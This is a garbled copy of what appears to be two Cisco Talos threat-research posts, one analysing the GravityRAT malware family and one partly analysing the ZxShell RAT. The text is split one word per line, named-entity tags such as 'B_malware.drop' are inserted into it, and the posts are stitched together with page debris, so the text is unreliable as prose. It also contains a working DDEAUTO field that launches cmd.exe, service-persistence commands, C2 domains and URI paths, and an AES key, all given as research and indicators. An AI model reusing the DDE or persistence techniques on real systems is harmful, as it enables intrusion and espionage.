By
enabling
macros
,
the
malware
is
able
to
begin
it's
execution
.

We
discovered
that
the
embedded
macro
is
quite
small
when
extracted
.

This
macro
contains
three
functions
:

The
first
one
is
executed
when
the
document
is
opened
.

The
purpose
is
to
copy
the
active
document
(
the
opened
Word
document
)
in
a
temporary
directory
and
to
rename
it
as
a
ZIP
archive
.

Indeed
,
the
docx
format
is
,
in
fact
,
a
common
ZIP
archive
,
and
can
be
unzipped
using
common
tools
.

The
second
function
decompresses
this
'
temporary.zip
'
file
and
extracts
the
.exe
file
stored
in
it
.

The
third
creates
a
scheduled
task
,
named
'
wordtest
'
,
to
execute
this
malicious
file
every
day
.

With
this
approach
,
the
attacker
ensures
that
there
is
no
direct
execution
(
the
executable
is
executed
thanks
to
scheduled
tasks
)
,
there's
no
download
of
an
additional
payload
,
and
finally
,
the
author
uses
the
fact
that
the
docx
format
is
an
archive
in
order
to
include
its
executable
(
GravityRAT  B_malware.drop
)
.

Testing
By
The
Author

During
our
tracking
,
we
identified
several
malicious
documents
submitted
from
this
actor
on
VirusTotal
for
testing
purposes
.

They
tested
the
detection
on
macros
(
by
modifying
them
,
or
by
executing
the
calc
instead
of
the
malicious
payload
)
and
the
developers
tried
dynamic
data
exchange
(
DDE
)
execution
in
the
Office
document
.

This
is
abusing
the
DDE
protocol
which
exists
within
Microsoft
Office
documents
.

Whilst
this
is
a
feature
Microsoft
provide
it
is
also
a
feature
that
an
attacker
can
leverage
for
malicious
activity
,
Microsoft
published
mitigation
information
here
previously
.

The
developer
crafted
Office
Word
and
Excel
documents
to
see
the
detection
in
VirusTotal
.

The
authors
tried
to
hide
the
DDE
object
in
a
different
part
of
the
document
—
in
the
main
object
and
the
header
,
for
example
.

The
DDE
object
simply
executes
Microsoft
calc
in
the
detected
sample
.

Here
is
an
example
:

<?xml
version='1.0
'
encoding='UTF-8
'
standalone='yes'?>
<w:document
[...redated...}]
mc:Ignorable='w14
w15
wp14'><w:body><w:p
w:rsidR='00215C91
'
w:rsidRDefault='008C166A'><w:r><w:fldChar
w:fldCharType='begin'/></w:r><w:r><w:instrText
xml:space='preserve'>
</w:instrText></w:r><w:r><w:rPr><w:rFonts
w:ascii='Helvetica
'
w:hAnsi='Helvetica
'
w:cs='Helvetica'/><w:color
w:val='383838'/><w:spacing
w:val='3'/><w:sz
w:val='26'/><w:szCs
w:val='26'/><w:shd
w:val='clear
'
w:color='auto
'
w:fill='FFFFFF'/></w:rPr><w:instrText>DDEAUTO
c:\\windows\\system32\\cmd.exe
'
/k
calc.exe'</w:instrText></w:r><w:r>
<w:instrText
xml:space='preserve'>
</w:instrText></w:r><w:r><w:fldChar
w:fldCharType='end'/></w:r><w:bookmarkStart
w:id='0
'
w:name='_GoBack'/>
<w:bookmarkEnd
w:id='0'/></w:p><w:sectPr
w:rsidR='00215C91'><w:pgSz
w:w='12240
'
w:h='15840'/><w:pgMar
w:top='1440
'
w:right='1440
'
w:bottom='1440
'
w:left='1440
'
w:header='720
'
w:footer='720
'
w:gutter='0'/>
<w:cols
w:space='720'/><w:docGrid
w:linePitch='360'/></w:sectPr></w:body>
</w:document>

We
believe
the
filenames
of
the
submitted
samples
are
clearly
testing
docs
,
using
different
methods
and
Office
tricks
to
attempt
to
ensure
his
malware
was
undetected
.

Those
names
were
:
testnew1.docx

Test123.docx
test456.docx
test2.docx
book1test2.xlsx
Test123.doc

GravityRAT  B_malware.drop

Our
initial
discovery
of
GravityRAT  B_malware.drop
was
through
a
malicious
Word
document
.

As
explained
previously
,
this
Word
document
had
various
macros
to
deliver
a
final
payload
.

Considering
that
this
was
the
most
recent
version
of
the
malware
,
we
decided
to
ascertain
how
long
this
actor
had
been
active
,
and
how
their
attacks
had
evolved
.

We
were
able
to
discover
four
distinct
versions
of
GravityRAT  B_malware.drop
,
developed
over
two
years
.

Next
,
we
will
go
through
what
we
believe
is
the
development
life
cycle
and
feature-addition
mission
carried
out
by
this
developer
.

Version
G1

The
malware
author
uses
a
versioning
system
starting
by
the
G
letter
.

The
oldest
version
we
identified
is
G1
.

Here
is
the
PDB
path
of
the
sample
:
f:\F\Windows
Work\G1\Adeel's
Laptop\G1
Main

Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb

You
can
notice
the
potential
first
name
of
the
developers
:
Adeel
.

Of
course
,
this
information
can
be
manipulated
by
the
malware
author
.

This
sample
was
compiled
in
December
2016
.

The
original
filename
of
the
sample
was
resume.exe
.

The
purpose
of
this
version
was
to
steal
information
on
the
compromised
system
:

MAC
Address

Computer
name

Username

IP
address

Date

Steal
files
with
the
following
extensions
:
.docx
,
.doc
,
.pptx
,
.ppt
,
.xlsx
,
.xls
,
.rtf
and
.pdf

The
volumes
mapped
on
the
system

All
this
information
was
then
sent
to
one
of
the
following
domains
:

G1
also
had
the
ability
to
execute
commands
remotely
on
the
infected
host
machine
at
the
author's
will
.

Version
G2

We
identified
a
new
variant
used
in
July
2017
named
G2
.

Here
is
the
PDB
of
the
sample
:
e:\Windows
Work\G2\G2
Main
Virus\Microsoft
Virus
Solutions
(
G2
v5
)
(Current)\Microsoft
Virus
Solutions\obj\Debug\Windows
Wireless
802.11.pdb

For
this
version
,
the
developer
modified
the
architecture
of
the
malware
.

The
main
code
aims
to
load
and
execute
two
additional
.NET
binaries
stored
in
the
resources
of
the
file
:

The
first
resource
is
a
legitimate
open-source
library
available
on
GitHub
.

It's
a
.NET
wrapper
for
the
Windows
Task
Scheduler

The
second
is
the
G2
version
of
GravityRAT  B_malware.drop

This
variant
shares
the
same
command
and
control
(
C2
)
servers
as
G1
,
however
,
we
have
an
additional
'
payload
'
variable
added
to
G2
.

This
variant
has
almost
identical
capabilities
as
the
previous
,
except
one
additional
functionality
:
It
collects
the
CPU
information
in
the
Win32_Processor
entry
via
WMI
request
(
Processor
ID
,
Name
,
Manufacturer
and
the
clock
speed
)
.

The
attacker
is
most
likely
using
this
information
as
part
of
an
anti-vm
attempt
within
this
malware
.

This
is
used
to
try
and
thwart
analysis
in
virtual
environments
.

In
a
slight
change
to
the
previous
variant
,
the
new
payloads
are
executed
with
a
Windows
Scheduled
Task
.

This
would
explain
the
inclusion
of
the
.NET
wrapper
.

The
analysed
sample
contained
a
decoy
picture
document
in
the
resource
section
:

Version
G3

In
August
2017
,
the
author
of
GravityRAT  B_malware.drop
used
a
new
variant
of
its
malware
,
G3
.

Here
is
the
PDB
:

F:\Projects\g3\G3
Version
4.0\G3\G3\obj\Release\Intel
Core.pdb

This
variant
uses
the
same
method
as
G2
,
and
includes
a
legitimate
library
in
the
resource
section
.

The
developers
also
added
additional
language
support
to
the
library
:

German

Spanish

French

Italian

Chinese

The
author
changed
the
backend
of
the
C2
server
with
this
variant
.

The
URI
changed
too
,
it
contains
the
GravityRAT  B_malware.drop
variant
name
:

August
was
also
the
same
month
the
Indian
CERT
notified
potential
victims
that
GravityRAT  B_malware.drop
had
been
used
in
a
targeted
campaign
.

Given
the
ongoing
development
nature
of
this
malware
,
it
meant
another
variant
was
most
likely
due
.

Version
GX

The
latest
version
of
GravityRAT  B_malware.drop
was
created
in
December
2017
named
GX
.

Here
is
the
PDB
:

C:\Users\The
Invincible\Desktop\gx\gx-currentprogram\LSASS\obj\Release\LSASS.pdb

This
version
is
the
most
advanced
variant
of
GravityRAT  B_malware.drop
.

Throughout
the
evolution
,
we
saw
this
malware
embedding
open-source
legitimate
.NET
libraries
(
for
schedule
tasks
,
compression
,
malware
embedding
open-source
legitimate
.NET
libraries
(
for
schedule
tasks
,
compression
,
encryption
,
.NET
loading
)
.

It
contains
a
resource
named
'
important
.
'

This
is
an
archive
with
a
password
.

This
variant
has
the
same
features
as
before
,
but
this
time
,
some
new
features
are
added
:

It
collects
open
ports
on
the
victim
host
by
running
the
netstat
command
.

It
lists
all
the
running
processes
.

It
lists
available
services
on
the
system
.

It
exfiltrates
.ppt
and
.pptx
file
,
in
addition
to
the
extension
mentioned
in
the
G1
variant
.

If
a
USB
key
is
connected
on
the
system
,
the
malware
steals
the
file
based
on
an
extension
list
.

It
supports
file
encryption
(
AES
with
the
key
'
lolomycin2017
'
)
.

It
collects
information
on
the
account
(
account
type
,
description
,
domain
name
,
full
name
,
SID
and
status
)
.

It
checks
if
the
system
is
a
virtual
machine
with
several
techniques
.

The
developer
implemented
a
total
of
seven
techniques
to
identify
if
the
compromised
system
is
a
virtual
machine
.

The
first
technique
consists
of
looking
at
any
additional
tools
used
by
the
hypervisor
that
are
installed
on
the
system
(
by
checking
a
registry
key
)
:

The
second
technique
uses
a
WMI
request
to
the
BIOS
version
(
Win32_BIOS
entry
)
.
If
the
response
contains
:
'
VMware
'
,
'
Virtual
'
,
'
XEN
'
,
'
Xen
'
or
'
A
M
I
'
the
system
is
considered
as
a
virtual
machine
.

Additionally
,
the
malware
checks
the
SerialNumber
and
the
version
of
the
BIOS
.

The
third
technique
uses
the
Win32_Computer
entry
in
WMI
.

It
checks
if
the
manufacturer
contains
'
VIRTUAL
'
,
'
VMWARE
'
or
'
VirtualBox
'
.

The
fourth
technique
checks
the
Processor
ID
of
the
system
.

The
fifth
technique
counts
the
number
of
cores
in
the
infected
system
(
the
author
expects
more
than
one
core
)
.

The
sixth
technique
checks
the
current
CPU
temperature
of
the
system
(
the
MSAcpi_ThermalZoneTemperature
entry
)
.

Indeed
,
some
hypervisors
(
VMWare
,
VirtualBox
and
Hyper-V
)
do
not
support
temperature
check
.

The
WMI
request
simply
replies
'
not
supported
'
.

This
behaviour
can
be
used
to
detect
if
the
targeted
system
is
a
real
machine
.

The
last
technique
uses
the
MAC
Address
of
the
infected
system
.

If
the
MAC
Address
starts
by
a
well-known
hexadecimal
number
,
the
system
is
identified
as
a
virtual
machine
.

The
C2
servers
communication
is
performed
in
HTTP
as
it
did
previously
.

The
variant
version
of
GX
is
used
in
the
URI
.

The
C2
servers
we
can
see
are
shared
with
the
previous
variants
:

WHAT
WE
KNOW
ABOUT
THE
AUTHOR

Below
,
we
will
present
evidence
that
we
have
obtained
regarding
the
attacker
and
the
associated
malware
.

Obviously
,
attribution
is
a
complex
field
.

The
developers
could
be
using
a
proxy
or
a
VPN
in
order
to
fake
the
origin
of
the
submission
.

But
,
we
will
still
simply
present
some
facts
concerning
this
actor
.

The
developer
used
at
least
two
different
usernames
in
the
past
two
years
:
'
The
Invincible
'
and
'
TheMartian
.
'
.

In
the
oldest
version
of
GravityRAT  B_malware.drop
,
the
attacker
potentially
leaked
his
or
her
first
name
in
the
PDB
:
'
Adeel
'
—
the
path
contained
'
Adeel's
Laptop
'
.

Additionally
,
all
the
malicious
Office
documents
,
and
more
specifically
the
documents
used
to
test
anti-virus
on
VirusTotal
,
were
submitted
from
Pakistan
.

One
of
the
four
PE
files
in
the
IOCs
section
was
sent
from
Pakistan
,
too
.

In
August
2017
,
the
Indian
National
CERT
published
an
advisory
about
malicious
targeted
campaigns
.

This
advisory
mentions
the
C2
server
infrastructure
of
GravityRAT  B_malware.drop
,
which
means
the
GravityRAT  B_malware.drop
author
likely
targeted
Indian
entities
/
organisations
.

By
leveraging
Cisco
Umbrella
and
using
the
Investigate
tool
,
we
were
able
to
determine
that
across
all
of
the
C2
domains
listed
,
we
saw
a
large
influx
of
traffic
originating
from
India
,
as
evidenced
by
the
National
CERT
,
all
of
the
C2
domains
were
at
least
50
percent
requested
by
Indian
IP
infrastructure
.

It
is
possible
that
some
of
the
non-Indian
IP
space
requests
may
artefacts
be
due
to
our
own
research
.

CONCLUSION

This
actor
is
probably
not
the
most
advanced
actor
we've
seen
.

But
he
or
she
managed
to
stay
under
the
radar
since
2016
.

They
worked
on
malicious
code
,
and
produced
four
variants
.

Each
new
variant
included
new
features
.

The
developer
used
the
same
C2
infrastructure
all
this
time
.

The
developer
was
clever
enough
to
keep
this
infrastructure
safe
,
and
not
have
it
blacklisted
by
a
security
vendor
.

The
actor
took
their
time
to
ensure
they
were
not
within
a
virtual
environment
to
avoid
analysis
.

However
,
they
did
not
take
any
time
at
all
to
attempt
to
obfuscate
their
.NET
code
.

The
code
was
largely
trivial
to
reverse
engineer
,
which
meant
static
analysis
was
an
easy
option
for
this
piece
of
malware
.

The
Indian
CERT
published
an
advisory
about
this
actor
,
which
suggest
they
targeted
Indian
entities
and
organizations
.

The
author
leaked
information
within
the
samples
(
i.e.
Adeel
)
and
on
the
VirusTotal
platform
.

Thanks
to
this
information
,
we
able
to
understand
how
they
tested
malicious
documents
in
order
to
decrease
detection
ratios
across
many
popular
engines
.

During
this
testing
period
,
all
the
samples
were
uploaded
from
Pakistan
to
VirusTotal
.

COVERAGE

Additional
ways
our
customers
can
detect
and
block
this
threat
are
listed
below
.

Advanced
Malware
Protection
(
AMP
)
is
ideally
suited
to
prevent
the
execution
of
the
malware
used
by
these
threat
actors
.

CWS
or
WSA
web
scanning
prevents
access
to
malicious
websites
and
detects
malware
used
in
these
attacks
.

Email
Security
can
block
malicious
emails
sent
by
threat
actors
as
part
of
their
campaign
.

Network
Security
appliances
such
as
NGFW
,
NGIPS
,
and
Meraki
MX
can
detect
malicious
activity
associated
with
this
threat
.

AMP
Threat
Grid
helps
identify
malicious
binaries
and
build
protection
into
all
Cisco
Security
products
.

Umbrella
,
our
secure
internet
gateway
(
SIG
)
,
blocks
users
from
connecting
to
malicious
domains
,

IPs
,
and
URLs
,
whether
users
are
on
or
off
the
corporate
network
.

Open
Source
Snort
Subscriber
Rule
Set
customers
can
stay
up
to
date
by
downloading
the
latest
rule
pack
available
for
purchase
on
Snort.org
.

IOCS

Malicious
Documents

MACROS

0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703
70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82
835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4

C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719
ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a
f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136

OTHER
MALICIOUS
DOCUMENTS
(
DDE
)
911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f
fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210
ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301
cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2
07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105

GravityRAT  B_malware.drop
9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a
1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc
99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90
1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96

C2
Servers
hxxp://cone[.]msoftupdates.com:46769  B_url.cncsvr
hxxp://ctwo[.]msoftupdates.com:46769  B_url.cncsvr
hxxp://cthree[.]msoftupdates.com:46769  B_url.cncsvr
hxxp://eone[.]msoftupdates.eu:46769 B_url.cncsvr
hxxp://etwo[.]msoftupdates.eu:46769 B_url.cncsvr
hxxp://msupdates[.]mylogisoft.com:46769 B_url.cncsvr
hxxp://coreupdate[.]msoftupdates.com:46769  B_url.cncsvr
hxxp://updateserver[.]msoftupdates.eu:46769 B_url.cncsvr


webpages
to
pdf
online
with
PDFmyURL
hxxp://updateserver[.]msoftupdates.eu:46769 B_url.normal
msoftupdates[.]com  B_url.normal
msoftupdates[.]eu B_url.normal
mylogisoft[.]com  B_url.normal

URI
:
/Gvty@/1ns3rt_39291384.php
/Gvty@/newIns3rt.php
/Gvty@/payloads
/Gvty@/ip.php
/G3/ServerSide/G3.php
/G3/Payload/
/GX/GX-Server.php
/GetActiveDomains.php

POSTED
BY
PAUL
RASCAGNERES
AT
11
:
11
AM

LABELS
:
.NET
,
APT
,
GRAVITYRAT  B_malware.drop
,
INDIA
,
MACROS
,
MALDOC
,
MALARE
ANALYSIS

SHARE
THIS

POST

NO
COMMENTS
:

POST
A
COMMENT

Enter
your
comment
...

Comment
as
:
Select
profile
...

Publish

Publish

Preview

Preview

NEWER

POST

HOME

SUBSCRIBE
TO
:
POST
COMMENTS
(
ATOM
)

OLDER

POST

Software

Reputation
Center

Vulnerability
Information

Library

Support
Communities

Microsoft
Advisory
Snort
Rules

IP
Blacklist
Download

AWBO
Exercises

About
Talos

Careers

Blog

CONNECT
WITH
US
©
2018
Cisco
Systems
,
Inc
.
and
/
or
its
affiliates
.

All
rights
reserved
.

View
our
Privacy
Policy
here
.
Threat
Spotlight
:
Group
72
,
Opening
the
ZxShell B_malware.backdoor

This
post
was
authored
by
Andrea
Allievi
,
Douglas
Goddard
,
Shaun
Hurley
,
and
Alain
Zidouemba
.

Recently
,
there
was
a
blog
post
on
the
takedown
of
a
botnet
used
by
threat
actor
group
known
as
Group
72
and
their
involvement
in
Operation
SMN
.

This
group
is
sophisticated
,
well
funded
,
and
exclusively
targets
high
profile
organizations
with
high
value
intellectual
property
in
the
manufacturing
,
industrial
,
aerospace
,
defense
,
and
media
sector
.

The
primary
attack
vectors
are
watering-hole B_malware.unknown
,
spear B_malware.drop
phishing  I
,
and
other
web-based
attacks
.

Frequently
,
a
remote  B_malware.drop
administration  I
tool  I
(
RAT B_malware.drop
)
is
used
to
maintain
persistence
within
a
victim's
organization
.

These
tools
are
used
to
further
compromise
the
organization
by
attacking
other
hosts
inside
the
targets
network
.

ZxShell B_malware.backdoor
(
aka
Sensocode
)
is
a
Remote  B_malware.drop
Administration  I
Tool  I
(
RAT B_malware.drop
)
used
by
Group
72
to
conduct
cyber-espionage
operations
.

Once
the
RAT B_malware.drop
is
installed
on
the
host
it
will
be
used
to
administer
the
client
,
exfiltrate
data
,
or
leverage
the
client
as
a
pivot
to
attack
an
organization's
internal
infrastructure
.

Here
is
a
short
list
of
the
types
of
tools
included
with
ZxShell B_malware.backdoor
:

Keylogger
(
used
to
capture
passwords
and
other
interesting
data
)

Command
line
shell
for
remote
administration

Remote
desktop

Various
network
attack
tools
used
to
fingerprint
and
compromise
other
hosts
on
the
network

Local
user
account
creation
tools

For
a
complete
list
of
tools
please
see
the
MainConnectionIo
section
.

The
following
paper
is
a
technical
analysis
on
the
functionality
of
ZxShell B_malware.backdoor
.

The
analysts
involved
were
able
to
identify
command
and
control
(
C2
)
servers
,
dropper
and
installation
methods
,
means
of
persistence
,
and
identify
the
attack
tools
that
are
core
to
the
RAT B_malware.drop
's
purpose
.

In
addition
,
the
researchers
used
their
analysis
to
provide
detection
coverage
for
Snort
,

Fireamp
,
and
ClamAV
.

Table
of
Contents

1
.
Background

2
.
Distribution
and
Delivery

3
.
Analysis
of
the
main
ZxShell B_malware.backdoor
module

DllMain

Install

ServiceMain

ShellMain

ShellMainThread

GetIpListAndConnect

MainConnectionIo

Uninstall

ZxFunction001

ZxFunction002

4
.
Command
and
Control
server

5
.
Malware
Package

6
.
Version
Information

7
.
Extracted
URL
Analysis

8
.
Conclusion

9
.
Protecting
Users
From
These
Threats

10
.
Appendix
A
:
Snort
rules

11
.
Appendix
B
:
ClamAV
signatures

12
.
Appendix
C
:
List
of
Memory
Offsets
for
Some
ZxShell B_malware.backdoor
Functions

13
.
Appendix
D
:
Other
Collateral

Background

ZxShell B_malware.backdoor
has
been
around
since
2004
.

There
are
a
lot
of
versions
available
in
the
underground
market
.

We
have
analyzed
the
most
common
version
of
ZxShell B_malware.backdoor
,
version
3.10
.
There
are
newer
versions
,
up
to
version
3.39
as
of
October
2014
.

Distribution
and
Delivery

An
individual
who
goes
by
the
name
LZX
in
some
online
forums
is
believed
to
be
the
original
author
of
ZxShell B_malware.backdoor
.

Since
ZxShell B_malware.backdoor
has
been
around
since
at
least
2004
,
numerous
people
have
purchased
or
obtained
the
tools
necessary
to
set
up
ZxShell B_malware.backdoor
command
and
control
servers
(
C&C
)
and
generate
the
malware
that
is
placed
on
the
victim's
network
.

ZxShell B_malware.backdoor
has
been
observed
to
be
distributed
through
phishing  B_malware.drop
attacks
,
dropped
by
exploits
that
leverage
vulnerabilities
such
as
CVE-20112462
,
CVE-2013-3163
,
and
CVE-2014-0322
.

Analysis
of
the
Main
ZxShell B_malware.backdoor
Module

To
illustrate
the
functionality
of
main
ZxShell B_malware.backdoor
module
,
Let's
take
a
look
at
the
following
sample
:

MD5
:
e3878d541d17b156b7ca447eeb49d96a  B_hash

SHA256
:
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c  B_hash

It
exports
the
following
functions
,
which
are
examined
in
greater
detail
below
:

DllMain

Install

UnInstall

ServiceMain

ShellMain

ShellMainThread

zxFunction001

zxFunction002

DllMain

DllMain
performs
the
initialization
of
ZxShell B_malware.backdoor
.

It
allocates
a
buffer
of
0x2800
bytes
and
copies
the
code
for
the
ZxGetLibAndProcAddr
function
.

To
copy
memory
,
the
memcpy
function
is
invoked
.

It
is
not
directly
used
from
msvcrt.dll
but
is
instead
copied
to
another
memory
chunk
before
being
called
.

Finally
,
the
trojan
Import
Address
Table
(
IAT
)
is
resolved
and
the
file
path
of
the
process
that
hosts
the
dll
is
resolved
and
saved
in
a
global
variable
.

Install

ZxShell.dll B_malware.backdoor
is
injected
in
a
shared
SVCHOST
process
.

The
Svchost
group
registry
key
HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SvcHost
is
opened
and
the
netsvc
group
value
data
is
queried
to
generate
a
name
for
the
service
.

Before
the
malware
can
be
installed
a
unique
name
must
to
be
generated
for
the
service
.

The
malware
accomplishes
this
through
querying
the
netsvc
group
value
data
located
in
the
svchost
group
registry
key
which
is
HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SvcHost
.

At
startup
,
Svchost.exe
checks
the
services
part
of
the
registry
and
constructs
a
list
of
services
to
load
.

Each
Svchost
session
can
contain
multiple
shared
services
that
are
organized
in
groups
.

Therefore
,
separate
services
can
run
,
depending
on
how
and
where
Svchost.exe
is
started
.

Image
1
.
Svchost
Groups
registry
key

Svchost.exe
groups
are
identified
in
the
above
registry
key
.

Each
value
under
this
key
represents
a
separate
Svchost
group
and
appears
as
a
separate
instance
when
you
are
viewing
active
processes
.

Each
value
is
a
REG_MULTI_SZ
value
and
contains
the
services
that
run
under
that
Svchost
group
.

Each
Svchost
group
can
contain
one
or
more
service
names
that
are
extracted
from
the
following
registry
key
,
whose
Parameters
key
contains
a
ServiceDLL
value
:
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service

On
a
Windows
machine
,
the
netsvc
group
contains
names
of
both
existing
and
non-existing
services
.

ZxShell B_malware.backdoor
exploits
this
fact
by
cycling
between
each
of
the
names
,
verifying
the
existence
of
the
real
service
.

The
service's
existence
is
verified
with
the
ServiceExists
function
,
which
attempts
to
open
the
relative
registry
sub-key
in
HKLM\SYSTEM\CurrentControlSet\Services
.

The
first
service
name
that
is
not
installed
on
the
system
becomes
the
ZxShell B_malware.backdoor
service
name
.

A
new
service
is
then
created
using
the
service
parser
function
ProcessScCommand
.

ZxShell B_malware.backdoor
implemented
its
own
version
of
the
Windows
SC
command
.

There
are
minor
differences
between
the
ZxShell B_malware.backdoor
implementation
of
this
command
and
the
original
Windows
one
,
but
they
are
irrelevant
for
the
purpose
of
the
analysis
The
command
used
to
install
the
service
is
:
sc
create
<
service
name
>
<
service
name
>
'
%SystemRoot%\System32\svchost.exe
-k
netsvcs
'
where
<
service
name
>
is
the
chosen
infected
service
name
.

Image
2
.
'
SC
'
command
used
to
create
the
target
service
,
and
parsed
by
'
ProcessScCommand
'
routine
.

The
installed
service
registry
key
is
opened
and
the
2
values
under
its
Parameter
subkey
are
created
.

These
2
values
,
ServiceDll
and
ServiceDllUnloadOnStop
are
needed
for
services
that
run
in
a
shared
process
.

Before
the
service
is
started
ChangeServiceConfig
is
called
to
modify
the
service
type
to
shared
and
interactive
.

If
the
service
fails
to
start
then
a
random
service
name
formatted
as
netsvc_xxxxxxxx
,
where
xxxxxxxx
represent
an
8-digit
random
hex
value
,
is
added
to
the
netsvc
group
and
the
entire
function
is
repeated
.

ServiceMain

This
function
is
the
entry
point
of
the
service
.

It
registers
the
service
using
the
RegisterServiceCtrlHandler
Windows
API
function
.

The
ZxShell B_malware.backdoor
service
handler
routine
is
only
a
stub
:
it
responds
to
each
service
request
code
,
doing
nothing
,
and
finally
exits
.

It
sets
the
service
status
to
RUNNING
and
finally
calls
the
ShellMain
function
of
ZxShell B_malware.backdoor
.

ShellMain

The
ShellMain
function
is
a
stub
that
relocates
the
DLL
to
another
buffer
and
spawns
a
thread
that
starts
from
ShellMainThreadInt
at
offset
+0xC0CD
.

The
ShellMainThreadInt
function
gets
the
HeapDestroy
Windows
API
address
and
replaces
the
first
3
bytes
with
the
RET
4
opcode
.

Subsequently
,
it
calls
the
FreeLibrary
function
to
free
its
own
DLL
buffer
located
at
its
original
address
.

Because
of
this
,
the
allocated
heaps
will
not
be
freed
.

It
re-copies
the
DLL
from
the
new
buffer
to
the
original
one
using
the
memcpy
function
.

Finally
,
it
spawns
the
main
thread
that
starts
at
the
original
location
of
ShellMainThread
procedure
,
and
terminates
.

At
this
point
,
the
ZxShell B_malware.backdoor
library
is
no
longer
linked
in
the
module
list
of
the
host
process
.

This
is
important
because
if
any
system
tool
tries
to
open
the
host
process
it
will
never
display
the
ZxShell B_malware.backdoor
DLL
.

ShellMainThread

This
thread
implements
the
main
code
,
responsible
for
the
entire
botnet
DLL
.

First
,
it
checks
if
the
DLL
is
executed
as
a
service
.

If
so
,
it
spawns
the
service
watchdog
thread
.

The
watchdog
thread
checks
the
registry
path
of
the
ZxShell B_malware.backdoor
service
every
2
seconds
,
to
verify
that
it
hasn't
been
modified
.

If
a
user
or
an
application
modifies
the
ZxShell B_malware.backdoor
service
registry
key
,
the
code
restores
the
original
infected
service
key
and
values
.

Image
3
.

The
watchdog
thread
of
ZxShell B_malware.backdoor
service
.

The
buffer
containing
the
ZxShell B_malware.backdoor
Dll
in
the
new
location
is
freed
using
the
VirtualFree
API
function
.

A
handle
to
the
DLL
file
is
taken
in
order
to
make
its
deletion
more
difficult
.

The
ZxShell B_malware.backdoor
mutex
is
created
named
@_ZxShell B_malware.backdoor
.

ZxShell B_malware.backdoor
plugins I
are
parsed
and
loaded
with
the
AnalyseAndLoadPlugins
function
.

The
plugin
registry
key
HKLM\SYSTEM\CurrentControlSet\Control\zxplug
is
opened
and
each
value
is
queried
.

The
registry
value
contains
the
plugin
file
name
.

The
target
file
is
loaded
using
the
LoadLibrary
API
function
,
and
the
address
of
the
exported
function
zxMain
is
obtained
with
GetProcAddress
.

If
the
target
filename
is
incorrect
or
invalid
the
plugin
file
is
deleted
and
the
registry
value
is
erased
.

That
is
performed
by
the
function
DeleteAndLogPlugin
.

Otherwise
,
the
plugin
is
added
to
an
internal
list
.

Here
is
the
data
structure
used
to
keep
track
of
the
plugins
:
typedef
struct
_ZX_PLUGINS_STRUCT
{
LPSTR
lpStrRegKey;
//
+
0x00
-
ZxShell B_malware.backdoor
Plugins I
registry
key
string
//
(
like
'
SYSTEM\CurrentControlSet\Control\zxplug
'
)

DWORD
dwUnknown2;
//
+
0x04
-
Unknown
DWORD
value

LPVOID
lp138hBuff;
//
+
0x08
-
Plugins
list

DWORD
dwZero;
//
+
0x0C
-
Always
zero

HANDLE
hReg;
//
+
0x10
-
Handle
to
plugin
registry
key
}
ZX_PLUGINS_STRUCT
,
*PZX_PLUGINS_STRUCT;

The
thread
KeyloggerThread
is
spawned
and
is
responsible
for
doing
keylogging
on
the
target
workstation
.

We
will
take
a
look
at
the
keylogger
later
on
.

Finally
the
main
network
communication
function
GetIpListAndConnect
is
called
.

GetIpListAndConnect

This
function
is
at
the
core
of
the
RAT's B_malware.drop
network
communication
.

It
starts
by
initializing
a
random
number
generator
and
reading
100
bytes
inside
the
ZxShell B_malware.backdoor
Dll
at
a
hardcoded
location
.

These
bytes
are
XOR
encrypted
with
the
byte-key
0x85
and
contains
a
list
of
remote
hosts
where
to
connect
.

The
data
is
decrypted
,
the
remote
host
list
is
parsed
and
verified
using
the
BuildTargetIpListStruct
function
.

There
are
3
types
of
lists
recognized
by
ZxShell B_malware.backdoor
:
plain
ip
addresses
,
HTTP
and
FTP
addresses
.

If
the
list
does
not
contain
any
item
,
or
if
the
verification
has
failed
,
the
ZxShell B_malware.backdoor
sample
tries
to
connect
to
a
hardcoded
host
with
the
goal
of
retrieving
a
new
updated
list
.

Otherwise
,
ZxShell B_malware.backdoor
tries
to
connect
to
the
first
item
of
the
list
.

If
ZxShell B_malware.backdoor
successfully
connects
to
the
remote
host
,
the
function
DoHandshake
is
called
.

This
function
implements
the
initial
handshake
which
consists
of
exchanging
16
bytes
,
0x00001985
and
0x00000425
,
with
the
server
.

The
function
GetLocalPcDescrStr
is
used
to
compose
a
large
string
that
contains
system
information
of
the
target
workstation
.

That
information
is
the
following
:
local
hostname
organization
owner
operating
system
details
CPU
speed
total
physical
memory

The
string
is
sent
to
the
remote
host
and
the
response
is
checked
to
see
if
the
first
byte
of
the
response
is
0xF4
,
an
arbitrary
byte
.

If
it
is
,
the
botnet
connection
I/O
procedure
is
called
through
the
MainConnectionIo
function
.

Image
4
.
The
GetLocalPcDescrStr
and
DoHandshake
functions
called
beforestarting
the
command
processing
.

Otherwise
,
the
ZxShell B_malware.backdoor
code
closes
the
socket
used
and
sleeps
for
30
seconds
.

It
will
then
retry
the
connection
with
the
next
remote
host
,
if
there
is
one
.

It
is
noteworthy
that
this
function
includes
the
code
to
set
the
ZxShell B_malware.backdoor
node
as
a
server
:
if
one
of
the
hardcoded
